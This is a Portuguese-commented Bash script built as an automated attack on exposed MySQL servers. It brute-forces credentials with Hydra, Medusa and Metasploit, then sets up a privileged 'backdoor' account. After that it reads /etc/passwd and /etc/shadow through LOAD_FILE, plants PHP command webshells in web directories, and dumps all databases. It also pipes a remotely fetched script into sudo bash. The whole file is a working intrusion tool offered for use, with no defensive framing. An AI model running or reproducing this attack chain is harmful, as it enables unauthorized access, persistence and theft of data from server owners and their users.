#!/bin/bash

################################################################################
# SCRIPT DE ATAQUE AUTÔNOMO - MySQL (Porta 3306)
# Descrição: Ataque agressivo e autônomo contra servidor MySQL exposto
################################################################################

# Solicitar target e IP do usuário
if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Uso: $0 <DOMINIO> <IP>"
    echo "Exemplo: $0 exemplo.com.br 192.168.1.100"
    exit 1
fi

TARGET="$1"
IP="$2"
PORT="3306"
LOG_DIR="./logs_mysql"
WORDLIST="/usr/share/wordlists/rockyou.txt"
RESULTS_FILE="$LOG_DIR/mysql_results.txt"

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}[+] Iniciando ataque autônomo contra MySQL${NC}"
echo -e "${GREEN}[+] Target: $TARGET:$PORT${NC}"

# Criar diretório de logs
mkdir -p $LOG_DIR

# Função para verificar e instalar ferramentas
check_and_install() {
    local tool=$1
    local install_cmd=$2
    
    if ! command -v $tool &> /dev/null; then
        echo -e "${YELLOW}[!] $tool não encontrado. Instalando...${NC}"
        eval $install_cmd
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[+] $tool instalado com sucesso${NC}"
        else
            echo -e "${RED}[-] Falha ao instalar $tool${NC}"
            exit 1
        fi
    else
        echo -e "${GREEN}[+] $tool encontrado${NC}"
    fi
}

# Verificar e instalar ferramentas necessárias
echo -e "${YELLOW}[*] Verificando ferramentas...${NC}"
check_and_install "nmap" "sudo apt-get update && sudo apt-get install -y nmap"
check_and_install "hydra" "sudo apt-get install -y hydra"
check_and_install "mysql" "sudo apt-get install -y mysql-client"
check_and_install "medusa" "sudo apt-get install -y medusa"
check_and_install "metasploit-framework" "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | sudo bash"

# Verificar se wordlist existe, se não, criar uma básica
if [ ! -f "$WORDLIST" ]; then
    echo -e "${YELLOW}[!] Wordlist não encontrada. Criando wordlist básica...${NC}"
    mkdir -p /usr/share/wordlists
    cat > /tmp/mysql_wordlist.txt << EOF
root
admin
password
123456
admin123
root123
mysql
test
guest
user
administrator
webadmin
sysadmin
netadmin
EOF
    WORDLIST="/tmp/mysql_wordlist.txt"
fi

echo -e "${GREEN}[+] Todas as ferramentas verificadas${NC}"

# FASE 1: RECONHECIMENTO
echo -e "${YELLOW}[*] FASE 1: Reconhecimento${NC}"
echo "=================================="

# Nmap - Informações do MySQL
echo -e "${YELLOW}[*] Executando nmap para identificar versão e informações...${NC}"
nmap -p $PORT --script mysql-info,mysql-enum,mysql-variables,mysql-databases,mysql-users $IP > $LOG_DIR/nmap_mysql.txt 2>&1
cat $LOG_DIR/nmap_mysql.txt

# Verificar se MySQL está acessível
echo -e "${YELLOW}[*] Testando conectividade MySQL...${NC}"
timeout 5 bash -c "echo > /dev/tcp/$IP/$PORT" 2>/dev/null
if [ $? -eq 0 ]; then
    echo -e "${GREEN}[+] MySQL está acessível${NC}"
else
    echo -e "${RED}[-] MySQL não está acessível${NC}"
    exit 1
fi

# FASE 2: ENUMERAÇÃO DE USUÁRIOS
echo -e "${YELLOW}[*] FASE 2: Enumeração de Usuários${NC}"
echo "=================================="

# Lista de usuários comuns para testar
USERS=("root" "admin" "administrator" "mysql" "test" "guest" "user" "webadmin" "sysadmin" "netadmin" "web")

echo -e "${YELLOW}[*] Testando usuários com senha vazia...${NC}"
for user in "${USERS[@]}"; do
    echo -e "${YELLOW}[*] Testando usuário: $user (senha vazia)${NC}"
    mysql -h $IP -u $user --skip-ssl -e "SELECT 1;" 2>&1 | tee -a $LOG_DIR/mysql_enum.txt
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] SUCESSO! Usuário $user com senha vazia encontrado!${NC}" | tee -a $RESULTS_FILE
    fi
done

# FASE 3: BRUTE FORCE AGRESSIVO
echo -e "${YELLOW}[*] FASE 3: Brute Force Agressivo${NC}"
echo "=================================="

echo -e "${YELLOW}[*] Iniciando Hydra com múltiplos usuários...${NC}"
hydra -L <(printf '%s\n' "${USERS[@]}") -P $WORDLIST -t 16 -W 1 -f $IP mysql 2>&1 | tee $LOG_DIR/hydra_results.txt

# Medusa como alternativa
echo -e "${YELLOW}[*] Iniciando Medusa (alternativa)...${NC}"
medusa -h $IP -u root -P $WORDLIST -M mysql -t 10 -f 2>&1 | tee $LOG_DIR/medusa_results.txt

# FASE 4: EXPLORAÇÃO
echo -e "${YELLOW}[*] FASE 4: Exploração${NC}"
echo "=================================="

# Tentar explorar vulnerabilidades conhecidas do MySQL 5.7
echo -e "${YELLOW}[*] Explorando vulnerabilidades do MySQL 5.7.23...${NC}"

# Verificar se conseguimos acesso
CREDS_FOUND=$(grep -i "login:\|password:" $LOG_DIR/hydra_results.txt $LOG_DIR/medusa_results.txt 2>/dev/null | head -1)

if [ ! -z "$CREDS_FOUND" ]; then
    echo -e "${GREEN}[+] Credenciais encontradas!${NC}"
    echo "$CREDS_FOUND" | tee -a $RESULTS_FILE
    
    # Extrair credenciais
    USER_FOUND=$(echo "$CREDS_FOUND" | grep -oP 'login: \K\w+')
    PASS_FOUND=$(echo "$CREDS_FOUND" | grep -oP 'password: \K\S+')
    
    if [ ! -z "$USER_FOUND" ] && [ ! -z "$PASS_FOUND" ]; then
        echo -e "${GREEN}[+] Tentando conectar com credenciais: $USER_FOUND / $PASS_FOUND${NC}"
        
        # Conectar e extrair informações
        mysql -h $IP -u "$USER_FOUND" -p"$PASS_FOUND" --skip-ssl << EOF 2>&1 | tee $LOG_DIR/mysql_exploit.txt
SHOW DATABASES;
SELECT user, host FROM mysql.user;
SHOW VARIABLES LIKE 'version%';
SELECT @@version;
EOF
        
        # Tentar criar usuário com privilégios
        echo -e "${YELLOW}[*] Tentando criar usuário backdoor...${NC}"
        mysql -h $IP -u "$USER_FOUND" -p"$PASS_FOUND" --skip-ssl << EOF 2>&1 | tee -a $LOG_DIR/mysql_exploit.txt
CREATE USER IF NOT EXISTS 'backdoor'@'%' IDENTIFIED BY 'P@ssw0rd123!';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
SELECT user, host FROM mysql.user WHERE user='backdoor';
EOF
        
        # Tentar ler arquivos do sistema
        echo -e "${YELLOW}[*] Tentando ler arquivos do sistema...${NC}"
        mysql -h $IP -u "$USER_FOUND" -p"$PASS_FOUND" --skip-ssl << EOF 2>&1 | tee -a $LOG_DIR/mysql_exploit.txt
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/hosts');
SELECT LOAD_FILE('/etc/shadow');
EOF
        
        # Tentar escrever arquivo (webshell)
        echo -e "${YELLOW}[*] Tentando criar webshell...${NC}"
        mysql -h $IP -u "$USER_FOUND" -p"$PASS_FOUND" --skip-ssl << EOF 2>&1 | tee -a $LOG_DIR/mysql_exploit.txt
SELECT '<?php system(\$_GET["cmd"]); ?>' INTO OUTFILE '/tmp/shell.php';
SELECT '<?php system(\$_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT '<?php system(\$_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php';
EOF
    fi
else
    echo -e "${YELLOW}[!] Nenhuma credencial encontrada via brute force${NC}"
    echo -e "${YELLOW}[*] Tentando exploração direta com usuários conhecidos...${NC}"
    
    # Tentar com usuários conhecidos do nmap enum
    for user in "${USERS[@]}"; do
        echo -e "${YELLOW}[*] Tentando $user com senhas comuns...${NC}"
        for pass in "root" "admin" "password" "123456" ""; do
            mysql -h $IP -u "$user" -p"$pass" --skip-ssl -e "SELECT 1;" 2>&1 | grep -v "Access denied" | grep -v "ERROR" && {
                echo -e "${GREEN}[+] SUCESSO! $user:$pass${NC}" | tee -a $RESULTS_FILE
                break
            }
        done
    done
fi

# FASE 5: METASPLOIT EXPLOITS
echo -e "${YELLOW}[*] FASE 5: Exploração com Metasploit${NC}"
echo "=================================="

# Criar script do Metasploit
cat > $LOG_DIR/mysql_exploit.rc << EOF
use auxiliary/scanner/mysql/mysql_login
set RHOSTS $IP
set USERNAME root
set BLANK_PASSWORDS true
set USER_AS_PASS true
run

use auxiliary/admin/mysql/mysql_enum
set RHOSTS $IP
set USERNAME root
set PASSWORD ""
run

use auxiliary/admin/mysql/mysql_sql
set RHOSTS $IP
set USERNAME root
set PASSWORD ""
set SQL "SHOW DATABASES;"
run

use exploit/windows/mysql/mysql_payload
set RHOSTS $IP
set USERNAME root
set PASSWORD ""
run
EOF

echo -e "${YELLOW}[*] Executando exploits do Metasploit...${NC}"
msfconsole -q -r $LOG_DIR/mysql_exploit.rc 2>&1 | tee $LOG_DIR/metasploit_results.txt

# FASE 6: PÓS-EXPLORAÇÃO
echo -e "${YELLOW}[*] FASE 6: Pós-Exploração${NC}"
echo "=================================="

if [ -f "$RESULTS_FILE" ] && [ -s "$RESULTS_FILE" ]; then
    echo -e "${GREEN}[+] Credenciais comprometidas encontradas!${NC}"
    echo -e "${GREEN}[+] Iniciando pós-exploração...${NC}"
    
    # Tentar estabelecer persistência
    echo -e "${YELLOW}[*] Criando backdoors e persistência...${NC}"
    
    # Listar todas as bases de dados e tentar extrair dados
    echo -e "${YELLOW}[*] Extraindo dados das bases de dados...${NC}"
    mysql -h $IP -u "$USER_FOUND" -p"$PASS_FOUND" --skip-ssl -e "SHOW DATABASES;" 2>/dev/null | while read db; do
        if [ "$db" != "Database" ] && [ "$db" != "information_schema" ] && [ "$db" != "performance_schema" ] && [ "$db" != "mysql" ]; then
            echo -e "${YELLOW}[*] Extraindo dados de: $db${NC}"
            mysqldump -h $IP -u "$USER_FOUND" -p"$PASS_FOUND" --skip-ssl "$db" > "$LOG_DIR/dump_$db.sql" 2>&1
        fi
    done
    
    echo -e "${GREEN}[+] Pós-exploração concluída${NC}"
else
    echo -e "${YELLOW}[!] Nenhuma credencial comprometida encontrada${NC}"
fi

# RESUMO
echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}[+] ATAQUE MYSQL CONCLUÍDO${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}[*] Logs salvos em: $LOG_DIR${NC}"
echo -e "${YELLOW}[*] Resultados em: $RESULTS_FILE${NC}"
echo ""
ls -lah $LOG_DIR/

